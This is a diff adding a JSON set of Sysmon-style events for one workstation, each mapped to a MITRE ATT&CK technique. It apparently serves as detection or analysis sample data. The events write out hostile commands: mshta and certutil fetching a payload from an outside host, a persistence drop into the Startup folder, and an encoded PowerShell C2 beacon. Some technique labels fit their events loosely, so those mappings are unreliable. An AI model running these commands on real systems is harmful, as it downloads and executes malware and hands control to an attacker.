@@ -1,0 +1,57 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-06-25T14:02:03Z",
+    "Computer": "HR-PC-22",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe http://paste-bin-cdn.net/load.hta",
+    "User": "HR-PC-22\\kbrown",
+    "MITRE_Technique": "T1204.002",
+    "Technique_Name": "Malicious File Execution",
+    "Confidence": 90
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-06-25T14:02:09Z",
+    "Computer": "HR-PC-22",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://paste-bin-cdn.net/payload.exe C:\\Users\\Public\\upd.exe",
+    "User": "HR-PC-22\\kbrown",
+    "MITRE_Technique": "T1105",
+    "Technique_Name": "Ingress Tool Transfer",
+    "Confidence": 90
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-06-25T14:02:21Z",
+    "Computer": "HR-PC-22",
+    "Image": "C:\\Users\\Public\\upd.exe",
+    "CommandLine": "upd.exe",
+    "User": "HR-PC-22\\kbrown",
+    "MITRE_Technique": "T1059.001",
+    "Technique_Name": "PowerShell (Command Execution)",
+    "Confidence": 90
+  },
+  {
+    "EventID": 11,
+    "UtcTime": "2026-06-25T14:02:25Z",
+    "Computer": "HR-PC-22",
+    "Image": "C:\\Users\\Public\\upd.exe",
+    "CommandLine": "C:\\Users\\kbrown\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.exe",
+    "User": "HR-PC-22\\kbrown",
+    "MITRE_Technique": "T1547.001",
+    "Technique_Name": "Registry/Startup Persistence",
+    "Confidence": 90
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2026-06-25T14:03:05Z",
+    "Computer": "HR-PC-22",
+    "Image": "C:\\Windows\\System32\\powershell.exe",
+    "CommandLine": "powershell.exe -enc SQBFAFgA...",
+    "DestinationIP": "194.61.55.18",
+    "MITRE_Technique": "T1071.001",
+    "Technique_Name": "Web Protocol C2",
+    "Confidence": 90
+  }
+]
